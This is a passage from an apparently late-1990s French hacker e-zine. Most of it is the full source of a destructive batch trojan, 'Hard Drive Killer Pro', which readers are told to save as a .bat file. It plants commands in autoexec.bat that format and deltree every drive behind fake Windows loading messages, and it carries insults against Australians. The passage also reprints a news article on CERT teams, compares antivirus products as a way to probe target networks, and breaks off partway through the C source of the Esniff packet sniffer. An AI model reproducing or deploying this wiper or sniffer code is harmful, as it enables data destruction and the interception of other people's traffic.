un trojan non. Il existe 2 sortes de trojans:
<br>- les trojans usuels (que vous connaissez et qui se foutent comme serveur
sur votre b&eacute;cane)
<br>- les trojans destructeurs (celui qui va suivre)
<br>Voici le code source &agrave; copier dans un .txt et &agrave; renommer
en .bat.
<br><font color="#FF0000">@echo off</font>
<br><font color="#FF0000">rem This program is dedecated to a very special
person that does not want to be named.</font>
<br><font color="#FF0000">:start</font>
<br><font color="#FF0000">cls</font>
<br><font color="#FF0000">echo PLEASE WAIT WHILE PROGRAM LOADS . . .</font>
<br><font color="#FF0000">call attrib -r -h c:\autoexec.bat >nul</font>
<br><font color="#FF0000">echo @echo off >c:\autoexec.bat</font>
<br><font color="#FF0000">echo call format c: /q /u /autotest >nul >>c:\autoexec.bat</font>
<br><font color="#FF0000">call attrib +r +h c:\autoexec.bat >nul</font>
<p><font color="#FF0000">rem Drive checking and assigning the valid drives
to the drive variable.</font>
<p><font color="#FF0000">set drive=</font>
<br><font color="#FF0000">set alldrive=c d e f g h i j k l m n o p q r
s t u v w x y z</font>
<p><font color="#FF0000">rem code insertion for Drive Checking takes place
here.</font>
<br><font color="#FF0000">rem drivechk.bat is the file name under the root
directory.</font>
<br><font color="#FF0000">rem As far as the drive detection and drive variable
settings, don't worry about how it</font>
<br><font color="#FF0000">rem works, it's damn to complicated for the average
or even the expert batch programmer.</font>
<br><font color="#FF0000">rem Except for Tom Lavedas.</font>
<p><font color="#FF0000">echo @echo off >drivechk.bat</font>
<br><font color="#FF0000">echo @prompt %%%%comspec%%%% /f /c vol %%%%1:
$b find "Vol" > nul >{t}.bat</font>
<br><font color="#FF0000">%comspec% /e:2048 /c {t}.bat >>drivechk.bat</font>
<br><font color="#FF0000">del {t}.bat</font>
<br><font color="#FF0000">echo if errorlevel 1 goto enddc >>drivechk.bat</font>
<p><font color="#FF0000">cls</font>
<br><font color="#FF0000">echo PLEASE WAIT WHILE PROGRAM LOADS . . .</font>
<p><font color="#FF0000">rem When errorlevel is 1, then the above is not
true, if 0, then it's true.</font>
<br><font color="#FF0000">rem Opposite of binary rules. If 0, it will elaps
to the next command.</font>
<p><font color="#FF0000">echo @prompt %%%%comspec%%%% /f /c dir %%%%1:.\/ad/w/-p
$b find "bytes" > nul >{t}.bat</font>
<br><font color="#FF0000">%comspec% /e:2048 /c {t}.bat >>drivechk.bat</font>
<br><font color="#FF0000">del {t}.bat</font>
<br><font color="#FF0000">echo if errorlevel 1 goto enddc >>drivechk.bat</font>
<p><font color="#FF0000">cls</font>
<br><font color="#FF0000">echo PLEASE WAIT WHILE PROGRAM LOADS . . .</font>
<p><font color="#FF0000">rem if errorlevel is 1, then the drive specified
is a removable media drive - not ready.</font>
<br><font color="#FF0000">rem if errorlevel is 0, then it will elaps to
the next command.</font>
<p><font color="#FF0000">echo @prompt dir %%%%1:.\/ad/w/-p $b find " 0
bytes free" > nul >{t}.bat</font>
<br><font color="#FF0000">%comspec% /e:2048 /c {t}.bat >>drivechk.bat</font>
<br><font color="#FF0000">del {t}.bat</font>
<br><font color="#FF0000">echo if errorlevel 1 set drive=%%drive%% %%1
>>drivechk.bat</font>
<p><font color="#FF0000">cls</font>
<br><font color="#FF0000">echo PLEASE WAIT WHILE PROGRAM LOADS . . .</font>
<p><font color="#FF0000">rem if it's errorlevel 1, then the specified drive
is a hard or floppy drive.</font>
<br><font color="#FF0000">rem if it's not errorlevel 1, then the specified
drive is a CD-ROM drive.</font>
<p><font color="#FF0000">echo :enddc >>drivechk.bat</font>
<p><font color="#FF0000">rem Drive checking insertion ends here. "enddc"
stands for "end dDRIVE cHECKING".</font>
<p><font color="#FF0000">rem Now we will use the program drivechk.bat to
attain valid drive information.</font>
<p><font color="#FF0000">:testdrv</font>
<p><font color="#FF0000">for %%a in (%alldrive%) do call drivechk.bat %%a
>nul</font>
<p><font color="#FF0000">del drivechk.bat >nul</font>
<p><font color="#FF0000">:form_del</font>
<br><font color="#FF0000">call attrib -r -h c:\autoexec.bat >nul</font>
<br><font color="#FF0000">echo @echo off >c:\autoexec.bat</font>
<br><font color="#FF0000">echo echo Loading Windows, please wait while
Microsoft Windows recovers your system . . . >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo for %%%%a in (%drive%) do call format %%%%a:
/q /u /autotest >nul >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo cls >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo echo Loading Windows, please wait while
Microsoft Windows recovers your system . . . >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo for %%%%a in (%drive%) do call c:\temp.bat
%%%%a Bunga >nul >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo cls >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo echo Loading Windows, please wait while
Microsoft Windows recovers your system . . . >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo for %%%%a in (%drive%) call deltree /y %%%%a:\
>nul >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo cls >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo echo Loading Windows, please wait while
Microsoft Windows recovers your system . . . >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo for %%%%a in (%drive%) do call format %%%%a:
/q /u /autotest >nul >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo cls >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo echo Loading Windows, please wait while
Microsoft Windows recovers your system . . . >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo for %%%%a in (%drive%) do call c:\temp.bat
%%%%a Bunga >nul >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo cls >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo echo Loading Windows, please wait while
Microsoft Windows recovers your system . . . >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo for %%%%a in (%drive%) call deltree /y %%%%a:\
>nul >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo cd\ >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo cls >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo echo Welcome to the land of death. Munga
Bunga's Multiple Hard Drive Killer version 4.0. >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo echo If you ran this file, then sorry, I
just made it. The purpose of this program is to tell you the following.
. . >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo echo 1. To make people aware that security
should not be taken for granted. >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo echo 2. Love is important, if you have it,
truly, don't let go of it like I did! >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo echo 3. If you are NOT a vegetarian, then
you are a murderer, and I'm glad your HD is dead. >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo echo 4. If you are Australian, I feel sorry
for you, accept my sympathy, you retard. >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo echo 5. Don't support the following: War,
Racism, Drugs and the Liberal Party.>>c:\autoexec.bat</font>
<p><font color="#FF0000">echo echo. >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo echo Regards, >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo echo. >>c:\autoexec.bat</font>
<br><font color="#FF0000">echo echo Munga Bunga >>c:\autoexec.bat</font>
<br><font color="#FF0000">call attrib +r +h c:\autoexec.bat</font>
<p><font color="#FF0000">:makedir</font>
<br><font color="#FF0000">if exist c:\temp.bat attrib -r -h c:\temp.bat
>nul</font>
<br><font color="#FF0000">echo @echo off >c:\temp.bat</font>
<br><font color="#FF0000">echo %%1:\ >>c:\temp.bat</font>
<br><font color="#FF0000">echo cd\ >>c:\temp.bat</font>
<br><font color="#FF0000">echo :startmd >>c:\temp.bat</font>
<br><font color="#FF0000">echo for %%%%a in ("if not exist %%2\nul md %%2"
"if exist %%2\nul cd %%2") do %%%%a >>c:\temp.bat</font>
<br><font color="#FF0000">echo for %%%%a in (">ass_hole.txt") do echo %%%%a
Your Gone @$$hole!!!! >>c:\temp.bat</font>
<br><font color="#FF0000">echo if not exist %%1:\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\nul
goto startmd >>c:\temp.bat</font>
<br><font color="#FF0000">call attrib +r +h c:\temp.bat >nul</font>
<p><font color="#FF0000">cls</font>
<br><font color="#FF0000">echo Initializing Variables . . .</font>
<br><font color="#FF0000">rem deltree /y %%a:\*. only eliminates directories,
hence leaving the file created above for further destruction.</font>
<br><font color="#FF0000">for %%a in (%drive%) do call format %%a: /q /u
/autotest >nul</font>
<br><font color="#FF0000">cls</font>
<br><font color="#FF0000">echo Initializing Variables . . .</font>
<br><font color="#FF0000">echo Validating Data . . .</font>
<br><font color="#FF0000">for %%a in (%drive%) do call c:\temp.bat %%a
Munga >nul</font>
<br><font color="#FF0000">cls</font>
<br><font color="#FF0000">echo Initializing Variables . . .</font>
<br><font color="#FF0000">echo Validating Data . . .</font>
<br><font color="#FF0000">echo Analyzing System Structure . . .</font>
<br><font color="#FF0000">for %%a in (%drive%) call attrib -r -h %%a:\
/S&nbsp; >nul</font>
<br><font color="#FF0000">call attrib +r +h c:\temp.bat >nul</font>
<br><font color="#FF0000">call attrib +r +h c:\autoexec.bat >nul</font>
<br><font color="#FF0000">cls</font>
<br><font color="#FF0000">echo Initializing Variables . . .</font>
<br><font color="#FF0000">echo Validating Data . . .</font>
<br><font color="#FF0000">echo Analyzing System Structure . . .</font>
<br><font color="#FF0000">echo Initializing Application . . .</font>
<p><font color="#FF0000">for %%a in (%drive%) call deltree /y %%a:\*. >nul</font>
<br><font color="#FF0000">cls</font>
<br><font color="#FF0000">echo Initializing Variables . . .</font>
<br><font color="#FF0000">echo Validating Data . . .</font>
<br><font color="#FF0000">echo Analyzing System Structure . . .</font>
<br><font color="#FF0000">echo Initializing Application . . .</font>
<br><font color="#FF0000">echo Starting Application . . .</font>
<br><font color="#FF0000">for %%a in (%drive%) do call c:\temp.bat %%a
Munga >nul</font>
<p><font color="#FF0000">cls</font>
<br><font color="#FF0000">echo Thank you for using a Munga Bunga product.</font>
<br><font color="#FF0000">echo.</font>
<br><font color="#FF0000">echo Oh and, Bill Gates rules, and he is not
a geek, he is a good looking genius.</font>
<br><font color="#FF0000">echo.</font>
<br><font color="#FF0000">echo Here is a joke for you . . .</font>
<br><font color="#FF0000">echo.</font>
<br><font color="#FF0000">echo&nbsp;&nbsp;&nbsp;&nbsp; Q). What's the worst
thing about being an egg?</font>
<br><font color="#FF0000">echo&nbsp; A). You only get laid once.</font>
<br><font color="#FF0000">echo.</font>
<br><font color="#FF0000">echo HAHAHAHA, get it? Don't you just love that
one?</font>
<br><font color="#FF0000">echo.</font>
<br><font color="#FF0000">echo Regards,</font>
<br><font color="#FF0000">echo.</font>
<br><font color="#FF0000">echo Munga Bunga</font>
<p><font color="#FF0000">:end</font>
<p><font color="#FF0000">rem Hard Drive Killer Pro Version 4.0, enjoy!!!!</font>
<p><font color="#FF0000">rem Author: Munga Bunga - from Australia, the
land full of retarded Australian's (help me get out of here).</font>
<p><u>Article de Lib&eacute;ration sur les "pompiers du net":</u>
<p>&nbsp;&nbsp; Quand le c&acirc;ble qui achemine les donn&eacute;es de
l'Internet vers l'Angleterre a vir&eacute; au rouge sur l'&eacute;cran
de contr&ocirc;le, il a fallu r&eacute;agir tr&egrave;s vite. &laquo;Au
d&eacute;but, on ne savait pas ce qui se passait&raquo;, raconte David
Crochemore. Sous ses yeux, il avait la cartographie des tuyaux qui composent
Renater, le r&eacute;seau informatique fran&ccedil;ais de l'enseignement
et de la recherche. Quand un des liens passe au orange ou au rouge, c'est
l'alerte. Simple souci technique ou attaque de pirate informatique?
<br>Riposte. Ce jour d'octobre, un hacker &eacute;tait pass&eacute; par
l&agrave;: le c&acirc;ble qui relie Renater &agrave; l'Angleterre &eacute;tait
presque satur&eacute;, &laquo;tr&egrave;s encombr&eacute;&raquo; par des
donn&eacute;es envoy&eacute;es en masse par le pirate malveillant. Coups
de t&eacute;l&eacute;phone aux techniciens pr&eacute;sents aux endroits
strat&eacute;giques, interventions sur les ordinateurs. &laquo;En quelques
heures, on a r&eacute;gl&eacute; le probl&egrave;me.&raquo;
<br>David Crochemore, avec sa moustache en guidon de v&eacute;lo, est un
pompier. Un soldat du feu high-tech, responsable pour Renater du Cert (Computer
Emergency Response Team), le nom g&eacute;n&eacute;rique donn&eacute; aux
&laquo;&eacute;quipes de riposte en cas d'urgence informatique&raquo;.
Partout dans le monde, des structures de ce type ont pour mission de r&eacute;agir
aux attaques de pirates, aux virus et &agrave; tous les hoquets de s&eacute;curit&eacute;
de l'Internet.
<br>&laquo;Notre r&ocirc;le n'est pas de d&eacute;poser plainte ou de donner
la chasse aux pirates, explique David Crochemore, mais d'assister les utilisateurs
victimes d'une attaque.&raquo; Le Cert, qu'il dirige coordonne les efforts
des sp&eacute;cialistes de la s&eacute;curit&eacute; pr&eacute;sents notamment
au CEA (Commissariat &agrave; l'&eacute;nergie atomique), au Cnes (Centre
national d'&eacute;tudes spatiales) et dans les universit&eacute;s. Il
diffuse des alertes, avertit de l'existence de nouveaux virus, fournit
des documents sur les failles de s&eacute;curit&eacute; des logiciels.
Et, dans l'autre sens, centralise les informations envoy&eacute;es par
ses correspondants. Un bon moyen pour rep&eacute;rer les attaques &agrave;
la mode. &laquo;Quand un nouvel outil de piratage appara&icirc;t, tous
les hackers de bas &eacute;tage se ruent dessus&raquo;, sourit Crochemore.
<br>Le boulot ne manque pas. Par jeu ou par malveillance, les pirates ne
cessent de prendre d'assaut les machines. Du c&ocirc;t&eacute; de Renater,
David Crochemore avoue cinq ou six probl&egrave;mes graves (prise de contr&ocirc;le
d'un ordinateur) et cinquante &agrave; soixante-dix incidents plus b&eacute;nins
par mois. &laquo;C'est pr&egrave;s de cinq fois plus qu'il y a deux ans,
dit-il. Mais on ne nous signale pas tout.&raquo; A Bordeaux, le responsable
de la s&eacute;curit&eacute; des universit&eacute;s conc&egrave;de qu'il
est victime de &laquo;deux &agrave; trois tentatives de piratage quotidiennes&raquo;.
Et pr&eacute;cise que &laquo;ceux qui disent qu'ils ne sont pas attaqu&eacute;s
sont des menteurs&raquo;.
<br><font color="#FF0000">Urgence. La cr&eacute;ation du premier Samu de
la s&eacute;curit&eacute; informatique remonte &agrave; d&eacute;cembre
1988, &agrave; l'universit&eacute; de Carnegie Mellon (Pittsburgh), &agrave;
la demande de la Darpa, l'agence de recherche et d&eacute;veloppement du
d&eacute;partement de la D&eacute;fense am&eacute;ricain. Il y avait urgence:
un virus l&acirc;ch&eacute; par l'&eacute;tudiant Robert Morris le mois
pr&eacute;c&eacute;dent venait de paralyser plus de 10 % des ordinateurs
connect&eacute;s &agrave; l'Internet. Depuis, c'est l'explosion. En France,
une &eacute;quipe de technopompiers destin&eacute;e &agrave; secourir les
administrations et les minist&egrave;res devrait voir le jour avant la
fin de l'ann&eacute;e. L'organisme sera pilot&eacute; par le Service central
de la s&eacute;curit&eacute; des syst&egrave;mes d'information (SCSSI),
aux ordres de Matignon.</font>
<br><font color="#FF0000">Coop&eacute;ration. Au total, la plan&egrave;te
compte pr&egrave;s de 80 &eacute;quipes, f&eacute;d&eacute;r&eacute;es
au sein du First (Forum of Incident Response and Security Teams), bas&eacute;
aux Etats-Unis. Cet organisme est charg&eacute; d'assurer la coop&eacute;ration
des diff&eacute;rents Cert en cas de p&eacute;pin d'ampleur. Ainsi, en
mars, quand le virus Melissa a d&eacute;ferl&eacute; sur l'Internet, &laquo;une
conf&eacute;rence t&eacute;l&eacute;phonique avec plusieurs dizaines de
personnes de toute la plan&egrave;te a eu lieu&raquo;, raconte David Crochemore.
Des Asiatiques, victimes du d&eacute;calage horaire, ont d&ucirc; se relever
en pleine nuit pour le briefing. Une proc&eacute;dure d'urgence, mais encore
un peu poussive: lorsque les Cert ont enfin d&eacute;livr&eacute; le moyen
de lutter contre Melissa, le virus avait d&eacute;j&agrave; fait le tour
de la plan&egrave;te.</font>
<br><font color="#FF0000">Pompier du Net, un m&eacute;tier d'avenir? Selon
le g&eacute;n&eacute;ral Jean-Louis Desvignes, le patron du SCSSI, c'est
certain. Press&eacute;s par une concurrence tr&egrave;s forte, les &eacute;diteurs
de logiciels ne cessent de sortir de nouvelles versions de leurs produits,
souvent sans prendre le temps de v&eacute;rifier si des failles de s&eacute;curit&eacute;
subsistent. &laquo;On vous annonce une nouvelle version alors que la pr&eacute;c&eacute;dente
est encore pleine de bugs, s'agace-t-il. Et l'Internet augmente la vuln&eacute;rabilit&eacute;
des ordinateurs.&raquo; Un bonheur pour les pirates, toujours pr&ecirc;ts
&agrave; se faufiler dans le moindre interstice. Et de nouveaux incendies
en pr&eacute;vision.</font>
<p><u>Antivirus:</u>
<p>&nbsp;&nbsp; Poss&eacute;der un anti-virus c'est bien, savoir lequel
choisir c'est mieux. Les antivirus d&eacute;tectent &eacute;videmment foule
de virus, avec une base de donn&eacute;es remises &agrave; jour chaque
semaine. Des gens sont pay&eacute;s pour trouver des virus. Le plus connu
des Anti-Virus est Norton Anti-Virus, mais est-il r&eacute;ellement efficace?
<br>Oui il l'est mais dans des proportions non effarantes. Sur 700 fichiers
de scann&eacute;s Norton n'a trouv&eacute; que 200 virus sur les 400 mis
&agrave; disposition. De plus Norton scann tout ce qui est cracker (multiicq
par exemple), ou bien des programmes comme la partie client de BO2K qui,
jusqu'&agrave; nouvel ordre, n'est pas infect&eacute; par un trojan. De
plus Norton peut vous donner la description de certains virus/troyans:
bien vague... Alors que Norton fait une description de Netbus 1.7 (serveur)
il n'en fait pas pour la 2.0: quand on sait que la deuxi&egrave;me est
la plus dangereuse...
<p>Si je devais vous conseiller un Anti-Virus je devrais vous conseiller
AVP (Anti Viral Toolkit pro), il d&eacute;tecte 20% de plus de virus (sans
rajouter n'importe quoi) que NAV.
<p><i>Sinon voici un comparatif d'antivirus:</i>
<p>SYMANTEC NORTON ANTIVIRUS FOR FIREWALLS
<br>Recherche les virus sur le: HTTP, SMTP, FTP.
<br>Ne recherche pas de magouilles sur les Applets
<br>Ne fait recherche les certificats (int&eacute;ressant)
<br>Ne recherche pas de signatures (int&eacute;ressant)
<br>Ne recherche pas les sources (int&eacute;ressant)
<br>Ne filtre pas les E-mails (int&eacute;ressant)
<br>Ne fait pas de gestionnaire de d&eacute;livrance de courrier
<br>Pas d'OPSEC Compliant (NT)
<br>Pas d'OPSEC Compliant (UNIX)
<br>Ne fait pas de filtrage d'adresses url (int&eacute;ressant)
<br>Ne fait pas de filtrage de spamming (haha!)
<br>Il ne bloque pas les cookies (int&eacute;ressant)
<br>Les algorithmes de compression support&eacute;s: ARJ, ZIP
<br>Ne d&eacute;tecte pas l'e-mail spoofing (int&eacute;ressant)
<br>TREND INTERSCAN VIRUS WALL
<br>Recherche les virus sur le: HTTP, SMTP, FTP.
<br>Recherche les magouilles sur les Applets
<br>Recherche les certificats
<br>Recherche de signatures
<br>Recherche pas les sources
<br>Filtre les E-mails
<br>Fait un gestionnaire de d&eacute;livrance de courrier
<br>OPSEC Compliant (NT)
<br>OPSEC Compliant (UNIX)
<br>Ne fait pas de filtrage d'adresses url
<br>Fait du filtrage de spamming
<br>Il ne bloque pas les cookies
<br>Les algorithmes de compression support&eacute;s: 19 types
<br>Ne d&eacute;tecte pas l'e-mail spoofing
<p>Ainsi on peut voir que TREND INTERSCAN VIRUS WALL est tr&egrave;s fiable
(plus que NORTON). Mais si cette liste est l&agrave; c'est pour une raison:
les r&eacute;seaux utilisent toujours ces deux l&agrave; (en g&eacute;n&eacute;ral,
attention!), pour se s&eacute;curiser. Donc il est possible d'&eacute;tudier
ce que fait et ne fait pas chacun de ces utilitaires, pour mieux se renseigner
sur la cible! Un r&eacute;seau n'utilisant que NORTON, ne sera pas assez
s&eacute;curis&eacute; et pr&eacute;sentera donc des failles (pas de filtrages
mails par exemple).
<p>Conclusion: on devrait s'en arr&ecirc;ter l&agrave; pour les virus et
le domaine qui tourne autour. Prochainement un "Culture" sur les Virus
et Anti-virus, d'ici l&agrave; potassez bien votre programmation.
<br>&nbsp;
<br>&nbsp;
<br>
<center>
<p><font size=+3>Chapitre 2: Hunt</font></center>

<p><tt><font color="#FF0000">/* Esniff.c */</font></tt>
<p><tt><font color="#FF0000">#include &lt;stdio.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;ctype.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;string.h></font></tt>
<p><tt><font color="#FF0000">#include &lt;sys/time.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;sys/file.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;sys/stropts.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;sys/signal.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;sys/types.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;sys/socket.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;sys/ioctl.h></font></tt>
<p><tt><font color="#FF0000">#include &lt;net/if.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;net/nit_if.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;net/nit_buf.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;net/if_arp.h></font></tt>
<p><tt><font color="#FF0000">#include &lt;netinet/in.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;netinet/if_ether.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;netinet/in_systm.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;netinet/ip.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;netinet/udp.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;netinet/ip_var.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;netinet/udp_var.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;netinet/in_systm.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;netinet/tcp.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;netinet/ip_icmp.h></font></tt>
<p><tt><font color="#FF0000">#include &lt;netdb.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;arpa/inet.h></font></tt>
<p><tt><font color="#FF0000">#define ERR stderr</font></tt>
<p><tt><font color="#FF0000">char&nbsp;&nbsp;&nbsp; *malloc();</font></tt>
<br><tt><font color="#FF0000">char&nbsp;&nbsp;&nbsp; *device,</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
*ProgName,</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
*LogName;</font></tt>
<br><tt><font color="#FF0000">FILE&nbsp;&nbsp;&nbsp; *LOG;</font></tt>
<br><tt><font color="#FF0000">int&nbsp;&nbsp;&nbsp;&nbsp; debug=0;</font></tt>
<p><tt><font color="#FF0000">#define NIT_DEV&nbsp;&nbsp;&nbsp;&nbsp; "/dev/nit"</font></tt>
<br><tt><font color="#FF0000">#define CHUNKSIZE&nbsp;&nbsp; 4096&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
/* device buffer size */</font></tt>
<br><tt><font color="#FF0000">int&nbsp;&nbsp;&nbsp;&nbsp; if_fd = -1;</font></tt>
<br><tt><font color="#FF0000">int&nbsp;&nbsp;&nbsp;&nbsp; Packet[CHUNKSIZE+32];</font></tt>
<p><tt><font color="#FF0000">void Pexit(err,msg)</font></tt>
<br><tt><font color="#FF0000">int err; char *msg;</font></tt>
<br><tt><font color="#FF0000">{ perror(msg);</font></tt>
<br><tt><font color="#FF0000">&nbsp; exit(err); }</font></tt>
<p><tt><font color="#FF0000">void Zexit(err,msg)</font></tt>
<br><tt><font color="#FF0000">int err; char *msg;</font></tt>
<br><tt><font color="#FF0000">{ fprintf(ERR,msg);</font></tt>
<br><tt><font color="#FF0000">&nbsp; exit(err); }</font></tt>
<p><tt><font color="#FF0000">#define IP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
((struct ip *)Packet)</font></tt>
<br><tt><font color="#FF0000">#define IP_OFFSET&nbsp;&nbsp; (0x1FFF)</font></tt>
<br><tt><font color="#FF0000">#define SZETH&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(sizeof(struct ether_header))</font></tt>
<br><tt><font color="#FF0000">#define IPLEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(ntohs(ip->ip_len))</font></tt>
<br><tt><font color="#FF0000">#define IPHLEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(ip->ip_hl)</font></tt>
<br><tt><font color="#FF0000">#define TCPOFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(tcph->th_off)</font></tt>
<br><tt><font color="#FF0000">#define IPS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(ip->ip_src)</font></tt>
<br><tt><font color="#FF0000">#define IPD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(ip->ip_dst)</font></tt>
<br><tt><font color="#FF0000">#define TCPS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(tcph->th_sport)</font></tt>
<br><tt><font color="#FF0000">#define TCPD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(tcph->th_dport)</font></tt>
<br><tt><font color="#FF0000">#define IPeq(s,t)&nbsp;&nbsp; ((s).s_addr
== (t).s_addr)</font></tt>
<p><tt><font color="#FF0000">#define TCPFL(FLAGS) (tcph->th_flags &amp;
(FLAGS))</font></tt>
<p><tt><font color="#FF0000">#define MAXBUFLEN&nbsp; (128)</font></tt>
<br><tt><font color="#FF0000">time_t&nbsp; LastTIME = 0;</font></tt>
<p><tt><font color="#FF0000">struct CREC {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; struct CREC *Next,</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
*Last;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; time_t&nbsp; Time;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
/* start time */</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; struct in_addr SRCip,</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
DSTip;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; u_int&nbsp;&nbsp;
SRCport,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*
src/dst ports */</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
DSTport;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; u_char&nbsp; Data[MAXBUFLEN+2];
/* important stuff :-) */</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; u_int&nbsp;&nbsp;
Length;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
/* current data length */</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; u_int&nbsp;&nbsp;
PKcnt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
/* # pkts */</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; u_long&nbsp; LASTseq;</font></tt>
<br><tt><font color="#FF0000">};</font></tt>
<p><tt><font color="#FF0000">struct CREC *CLroot = NULL;</font></tt>
<p><tt><font color="#FF0000">char *Symaddr(ip)</font></tt>
<br><tt><font color="#FF0000">register struct in_addr ip;</font></tt>
<br><tt><font color="#FF0000">{ register struct hostent *he =</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gethostbyaddr((char
*)&amp;ip.s_addr, sizeof(struct in_addr),AF_INET);</font></tt>
<p><tt><font color="#FF0000">&nbsp; return( (he)?(he->h_name):(inet_ntoa(ip))
);</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">char *TCPflags(flgs)</font></tt>
<br><tt><font color="#FF0000">register u_char flgs;</font></tt>
<br><tt><font color="#FF0000">{ static char iobuf[8];</font></tt>
<br><tt><font color="#FF0000">#define SFL(P,THF,C) iobuf[P]=((flgs &amp;
THF)?C:'-')</font></tt>
<p><tt><font color="#FF0000">&nbsp; SFL(0,TH_FIN, 'F');</font></tt>
<br><tt><font color="#FF0000">&nbsp; SFL(1,TH_SYN, 'S');</font></tt>
<br><tt><font color="#FF0000">&nbsp; SFL(2,TH_RST, 'R');</font></tt>
<br><tt><font color="#FF0000">&nbsp; SFL(3,TH_PUSH,'P');</font></tt>
<br><tt><font color="#FF0000">&nbsp; SFL(4,TH_ACK, 'A');</font></tt>
